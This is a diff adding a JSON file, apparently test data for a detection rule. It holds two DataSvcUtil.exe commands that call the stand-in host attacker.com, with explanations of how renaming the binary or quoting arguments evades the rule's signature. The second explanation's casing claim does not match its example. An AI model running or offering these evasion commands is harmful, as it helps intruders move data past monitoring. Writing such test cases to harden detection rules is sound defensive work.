@@ -1,0 +1,10 @@
+[
+  {
+    "output": "copy C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\DataSvcUtil.exe C:\\Users\\Public\\\not\\_suspicious.exe && C:\\Users\\Public\\\not\\_suspicious.exe /uri:http://attacker.com/data /out:C:\\Windows\\Temp\\proxy.cs",
+    "explanation": "The rule relies on 'selection\\_img' which checks if the Image ends with '\\DataSvcUtil.exe' or if the OriginalFileName metadata is present. By renaming the binary to 'not\\_suspicious.exe', the 'Image' check is bypassed. If the EDR/SIEM does not reliably extract or check 'OriginalFileName' for renamed binaries in real-time, the rule will not trigger."
+  },
+  {
+    "output": "DataSvcUtil.exe \"/uri:http://attacker.com\" \"/out:C:\\\temp\\out.cs\" \"/in:C:\\\temp\\in.cs\"",
+    "explanation": "In some SIEM environments, the 'contains' operator for CommandLine is case-sensitive depending on the underlying engine configuration (e.g., specific Elasticsearch or Grep setups). Using variations in casing or quoting arguments can sometimes evade simple string-match signatures that expect lowercase or unquoted patterns."
+  }
+]
